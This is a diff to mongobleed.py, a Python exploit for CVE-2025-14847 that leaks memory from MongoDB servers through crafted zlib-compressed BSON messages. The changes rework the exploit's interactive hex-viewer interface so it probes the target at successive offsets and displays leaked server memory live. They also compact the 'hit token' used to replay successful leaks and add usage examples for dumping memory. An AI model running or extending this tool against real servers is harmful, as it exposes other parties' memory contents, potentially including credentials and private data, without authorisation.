@@ -2,8 +2,10 @@
 """
 mongobleed.py - CVE-2025-14847 MongoDB Memory Leak Exploit
 
-Author: Joe Desimone - x.com/dez_
-Contributor: @hkashfi Hamid Kashfi
+Authors:
+  Hamid Kashfi (@hkashfi)
+  Codex (OpenAI)
+  Joe Desimone (x.com/dez_)
 
 Exploits zlib decompression bug to leak server memory via BSON field names.
 Technique: Craft BSON with inflated doc_len, server reads field names from
@@ -25,22 +27,13 @@ import time
 import warnings
 import zlib
 import random
+import asyncio
 import sys
-import termios
-import tty
-import queue
-import atexit
-import shutil
 from collections import deque
 
 from rich.console import Console
 from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
-from rich.live import Live
-from rich.table import Table
 from rich.text import Text
-from rich.console import Group
-from rich import box
-from rich.panel import Panel
 from rich.layout import Layout
 from urllib.parse import unquote_to_bytes
 
@@ -202,6 +195,8 @@ def main():
         "  python3 mongobleed.py --host <target> --tui --loop\n"
         "  python3 mongobleed.py --hit <token>\n"
         "  python3 mongobleed.py --hit <token> --hit-wiggle 32 --loop\n"
+        "  python3 mongobleed.py --auto --loop --decode\n"
+        "  python3 mongobleed.py --hit <token> --tui --tui-refresh 0.5\n"
         "  python3 mongobleed.py --host <target> --dump 10MB\n"
         "  python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048\n"
         "  python3 mongobleed.py --host <target> --dump 512KB --preview-bytes 4096 --decode\n"
@@ -419,14 +414,11 @@ def main():
 
     def encode_hit_token(doc_len):
         payload = {
-            "doc_len": doc_len,
-            "buffer_extra": args.buffer_extra,
-            "timeout": args.timeout,
-            "preview_bytes": args.preview_bytes,
-            "host": args.host,
-            "port": args.port,
-            "decode": args.decode,
-            "hex": args.hex,
+            "d": doc_len,
+            "b": args.buffer_extra,
+            "t": args.timeout,
+            "h": args.host,
+            "p": args.port,
         }
         raw = json.dumps(payload, separators=(",", ":")).encode("utf-8")
         return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
@@ -436,84 +428,22 @@ def main():
         raw = base64.urlsafe_b64decode(token + pad)
         return json.loads(raw.decode("utf-8"))
 
-    def _key_listener(q, stop_event):
-        fd = sys.stdin.fileno()
-        try:
-            old = termios.tcgetattr(fd)
-            tty.setraw(fd)
-        except Exception:
-            return
-
-        def restore():
-            try:
-                termios.tcsetattr(fd, termios.TCSADRAIN, old)
-            except Exception:
-                pass
-
-        atexit.register(restore)
-        while not stop_event.is_set():
-            ch = sys.stdin.read(1)
-            if not ch:
-                continue
-            if ch == "\x03":
-                q.put("quit")
-                break
-            if ch == "q":
-                q.put("quit")
-                break
-            if ch == "\x1b":
-                seq = sys.stdin.read(2)
-                if seq == "[A":
-                    q.put("up")
-                elif seq == "[B":
-                    q.put("down")
-                elif seq == "[5":
-                    if sys.stdin.read(1) == "~":
-                        q.put("pageup")
-                elif seq == "[6":
-                    if sys.stdin.read(1) == "~":
-                        q.put("pagedown")
-        restore()
-
     def _render_row_bytes(offset, data, last_change, now_ts):
         hex_text = Text()
         ascii_text = Text()
         for i, b in enumerate(data):
             age = now_ts - last_change[i]
             if age < 0.5:
-                style = "bold yellow on blue"
+                style = "bold yellow on #0000aa"
             elif age < 1.5:
-                style = "bright_yellow on blue"
+                style = "bright_yellow on #0000aa"
             elif age < 3.0:
-                style = "white on blue"
+                style = "white on #0000aa"
             else:
-                style = "white on blue"
+                style = "white on #0000aa"
             hex_text.append(f"{b:02x} ", style=style)
             ascii_text.append(chr(b) if 32 <= b <= 126 else ".", style=style)
         return hex_text, ascii_text
-
-    def _build_tui_table(base_offset, rows, row_bytes, row_changes):
-        table = Table(
-            expand=True,
-            box=box.SQUARE,
-            style="white on blue",
-            header_style="bold yellow on blue",
-            title_style="bold yellow on blue",
-            pad_edge=False,
-            padding=(0, 0),
-            show_lines=False,
-        )
-        table.add_column("Offset", justify="right", no_wrap=True, style="bright_green on blue", width=10)
-        table.add_column("Hex", no_wrap=True, style="white on blue")
-        table.add_column("ASCII", no_wrap=True, style="white on blue")
-        now_ts = time.time()
-        for idx in range(rows):
-            offset = base_offset + idx * 16
-            data = row_bytes.get(offset, b"\x00" * 16)
-            changes = row_changes.get(offset, [0.0] * 16)
-            hex_text, ascii_text = _render_row_bytes(offset, data, changes, now_ts)
-            table.add_row(f"{offset:08x}", hex_text, ascii_text)
-        return table
 
     def auto_window_for_size(size):
         return max(1024, min(65536, size // 2048))
@@ -643,14 +573,11 @@ def main():
         except Exception:
             console.print("[bold red][!][/bold red] Invalid hit token.")
             return
-        args.host = hit.get("host", args.host)
-        args.port = int(hit.get("port", args.port))
-        args.buffer_extra = int(hit.get("buffer_extra", args.buffer_extra))
-        args.timeout = float(hit.get("timeout", args.timeout))
-        args.preview_bytes = int(hit.get("preview_bytes", args.preview_bytes))
-        args.decode = bool(hit.get("decode", args.decode))
-        args.hex = bool(hit.get("hex", args.hex))
-        doc_len = int(hit.get("doc_len", 0))
+        args.host = hit.get("h", args.host)
+        args.port = int(hit.get("p", args.port))
+        args.buffer_extra = int(hit.get("b", args.buffer_extra))
+        args.timeout = float(hit.get("t", args.timeout))
+        doc_len = int(hit.get("d", 0))
         if doc_len <= 0:
             console.print("[bold red][!][/bold red] Hit token missing doc_len.")
             return
@@ -723,101 +650,155 @@ def main():
                 console.print("[bold yellow][!][/bold yellow] Ctrl+C detected, stopping hit replay.")
                 return
     if args.tui:
-        base_offset = tui_base_offset if tui_base_offset is not None else args.min_offset
-        if args.tui_auto_size:
-            term = shutil.get_terminal_size(fallback=(80, 24))
-            rows = max(4, term.lines - 6)
-        else:
-            rows = max(1, args.tui_rows)
-        row_bytes = {}
-        row_changes = {}
-        key_q = queue.Queue()
-        stop_event = threading.Event()
-        listener = threading.Thread(target=_key_listener, args=(key_q, stop_event), daemon=True)
-        listener.start()
-        def _tui_panel(renderable):
-            return Panel(renderable, style="white on blue", padding=(0, 0), box=box.SQUARE, expand=True)
-
         try:
-            with Live(auto_refresh=False, console=console, screen=True, transient=False) as live:
-                last_time = time.time()
-                status = Text(
-                    f"base=0x{base_offset:x} rows={rows} refresh={args.tui_refresh:.1f}s rate=0.0/s "
-                    f"workers={args.workers} decode={'on' if args.decode else 'off'} optimize={'on' if args.optimize else 'off'}",
-                    style="bold white on blue",
+            from textual.app import App, ComposeResult
+            from textual.widgets import Static
+            from textual.reactive import reactive
+        except Exception:
+            console.print("[bold red][!][/bold red] Textual is required for --tui. Install with `pip install textual`.")
+            return
+
+        base_offset = tui_base_offset if tui_base_offset is not None else args.min_offset
+
+        class HexViewerApp(App):
+            CSS = """
+            Screen {
+                background: #0000aa;
+                color: #ffffff;
+            }
+            #status {
+                background: #555500;
+                color: #000000;
+                text-style: bold;
+                height: 1;
+            }
+            #tip {
+                background: #0000aa;
+                color: #ffff55;
+                text-style: bold;
+                height: 1;
+            }
+            #footer {
+                background: #555500;
+                color: #000000;
+                text-style: bold;
+                height: 1;
+            }
+            #dump {
+                background: #0000aa;
+                color: #ffffff;
+                border: solid #aaaaaa;
+            }
+            """
+
+            base = reactive(base_offset)
+            rows = reactive(args.tui_rows)
+            rate = reactive(0.0)
+
+            def __init__(self):
+                super().__init__()
+                self.row_bytes = {}
+                self.row_changes = {}
+                self.executor = concurrent.futures.ThreadPoolExecutor(
+                    max_workers=max(1, min(args.workers, args.tui_rows))
                 )
-                tip = Text("↑/↓ move 16 bytes  PgUp/PgDn page  q quit", style="bold yellow on blue")
-                header = Panel(Group(status, tip), style="white on blue", padding=(0, 1), box=box.SQUARE)
-                body = _tui_panel(_build_tui_table(base_offset, rows, row_bytes, row_changes))
-                layout = Layout()
-                layout.split_column(Layout(header, size=3), Layout(body))
-                live.update(layout, refresh=True)
-                while True:
-                    now = time.time()
-                    elapsed = now - last_time
-                    if elapsed < args.tui_refresh:
-                        time.sleep(args.tui_refresh - elapsed)
-                    last_time = time.time()
 
-                    while not key_q.empty():
-                        key = key_q.get()
-                        if key == "quit":
-                            stop_event.set()
-                            return
-                        if key == "up":
-                            base_offset = max(0, base_offset - 16)
-                        elif key == "down":
-                            base_offset += 16
-                        elif key == "pageup":
-                            base_offset = max(0, base_offset - rows * 16)
-                        elif key == "pagedown":
-                            base_offset += rows * 16
+            def compose(self) -> ComposeResult:
+                yield Static(id="status")
+                yield Static("↑/↓ move 16 bytes  PgUp/PgDn page  q quit", id="tip")
+                yield Static(id="dump")
+                yield Static(id="footer")
 
-                    offsets = [base_offset + i * 16 for i in range(rows)]
-                    with concurrent.futures.ThreadPoolExecutor(max_workers=min(args.workers, rows)) as executor:
-                        futures = {
-                            executor.submit(
-                                send_probe_reuse,
-                                args.host,
-                                args.port,
-                                off,
-                                off + args.buffer_extra,
-                                args.timeout,
-                            ): off
-                            for off in offsets
-                        }
-                        for future in concurrent.futures.as_completed(futures):
-                            off = futures[future]
-                            response, ok = future.result()
-                            data = b""
-                            if ok:
-                                leaks = extract_leaks(response)
-                                if leaks:
-                                    data = leaks[0]
-                            view = data[:16].ljust(16, b"\x00")
-                            prev = row_bytes.get(off, b"\x00" * 16)
-                            changes = row_changes.get(off, [0.0] * 16)
-                            now_ts = time.time()
-                            for i, b in enumerate(view):
-                                if i >= len(prev) or b != prev[i]:
-                                    changes[i] = now_ts
-                            row_bytes[off] = view
-                            row_changes[off] = changes
+            def on_mount(self) -> None:
+                if args.tui_auto_size:
+                    self._apply_auto_rows()
+                self.set_interval(args.tui_refresh, self.refresh_view)
+                self.refresh_view()
 
-                    rate = 1.0 / max(args.tui_refresh, 0.001)
-                status = Text(
-                    f"base=0x{base_offset:x} rows={rows} refresh={args.tui_refresh:.1f}s rate={rate:.1f}/s "
-                    f"workers={args.workers} decode={'on' if args.decode else 'off'} optimize={'on' if args.optimize else 'off'}",
-                    style="bold white on blue",
+            def on_resize(self) -> None:
+                if args.tui_auto_size:
+                    self._apply_auto_rows()
+                    self.refresh_view()
+
+            def _apply_auto_rows(self) -> None:
+                usable = max(4, self.size.height - 3)
+                self.rows = usable
+
+            async def refresh_view(self) -> None:
+                t0 = time.time()
+                offsets = [self.base + i * 16 for i in range(self.rows)]
+                loop = asyncio.get_running_loop()
+                tasks = [
+                    loop.run_in_executor(
+                        self.executor,
+                        send_probe_reuse,
+                        args.host,
+                        args.port,
+                        off,
+                        off + args.buffer_extra,
+                        args.timeout,
+                    )
+                    for off in offsets
+                ]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                for off, result in zip(offsets, results):
+                    data = b""
+                    ok = False
+                    if isinstance(result, tuple):
+                        response, ok = result
+                    if ok:
+                        leaks = extract_leaks(response)
+                        if leaks:
+                            data = leaks[0]
+                    view = data[:16].ljust(16, b"\x00")
+                    prev = self.row_bytes.get(off, b"\x00" * 16)
+                    changes = self.row_changes.get(off, [0.0] * 16)
+                    now_ts = time.time()
+                    for i, b in enumerate(view):
+                        if i >= len(prev) or b != prev[i]:
+                            changes[i] = now_ts
+                    self.row_bytes[off] = view
+                    self.row_changes[off] = changes
+
+                self.rate = 1.0 / max(args.tui_refresh, 0.001)
+                status = (
+                    f"base=0x{self.base:x} rows={self.rows} refresh={args.tui_refresh:.1f}s "
+                    f"rate={self.rate:.1f}/s workers={args.workers} "
+                    f"decode={'on' if args.decode else 'off'} optimize={'on' if args.optimize else 'off'}"
                 )
-                header = Panel(Group(status, tip), style="white on blue", padding=(0, 1), box=box.SQUARE)
-                body = _tui_panel(_build_tui_table(base_offset, rows, row_bytes, row_changes))
-                layout = Layout()
-                layout.split_column(Layout(header, size=3), Layout(body))
-                live.update(layout, refresh=True)
-        except KeyboardInterrupt:
-            stop_event.set()
-            console.print("[bold yellow][!][/bold yellow] TUI interrupted.")
+                self.query_one("#status", Static).update(status)
+                footer = "MC-TUI  |  q=quit  arrows=move  PgUp/PgDn=page"
+                self.query_one("#footer", Static).update(footer)
+                self.query_one("#dump", Static).update(self._render_dump())
+
+            def _render_dump(self) -> Text:
+                out = Text()
+                now_ts = time.time()
+                for idx in range(self.rows):
+                    offset = self.base + idx * 16
+                    data = self.row_bytes.get(offset, b"\x00" * 16)
+                    changes = self.row_changes.get(offset, [0.0] * 16)
+                    hex_text, ascii_text = _render_row_bytes(offset, data, changes, now_ts)
+                    out.append(f"{offset:08x}  ", style="bold green on #0000aa")
+                    out.append(hex_text)
+                    out.append(" |", style="white on #0000aa")
+                    out.append(ascii_text)
+                    out.append("|\n", style="white on #0000aa")
+                return out
+
+            def on_key(self, event) -> None:
+                if event.key == "q":
+                    self.exit()
+                elif event.key == "up":
+                    self.base = max(0, self.base - 16)
+                elif event.key == "down":
+                    self.base += 16
+                elif event.key == "pageup":
+                    self.base = max(0, self.base - self.rows * 16)
+                elif event.key == "pagedown":
+                    self.base += self.rows * 16
+
+        HexViewerApp().run()
         return
 
     if args.auto:
@@ -1168,8 +1149,8 @@ def main():
                                 new_in_pass += 1
 
                                 # Show interesting leaks (> 10 bytes)
+                                preview = ascii_preview(data, args.preview_bytes)
                                 if len(data) > 10:
-                                    preview = ascii_preview(data, args.preview_bytes)
                                     if args.decode:
                                         variants = decode_variants(data, args.preview_bytes * 2)
                                         if variants:
@@ -1178,13 +1159,13 @@ def main():
                                             cleaned = decode_from_preview(preview, args.preview_bytes * 2)
                                             if cleaned:
                                                 preview = cleaned
-                                if (args.decode and not is_mostly_printable(preview)) or args.hex:
-                                    hexdump = hexdump_preview(data, args.preview_bytes)
-                                    console.print(
-                                        f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}:\n{hexdump}"
-                                    )
-                                else:
-                                    console.print(f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}: {preview}")
+                                    if (args.decode and not is_mostly_printable(preview)) or args.hex:
+                                        hexdump = hexdump_preview(data, args.preview_bytes)
+                                        console.print(
+                                            f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}:\n{hexdump}"
+                                        )
+                                    else:
+                                        console.print(f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}: {preview}")
                                 hit_token = encode_hit_token(doc_len)
                                 console.print(f"[dim]hit={hit_token}[/dim]")
             if args.loop:
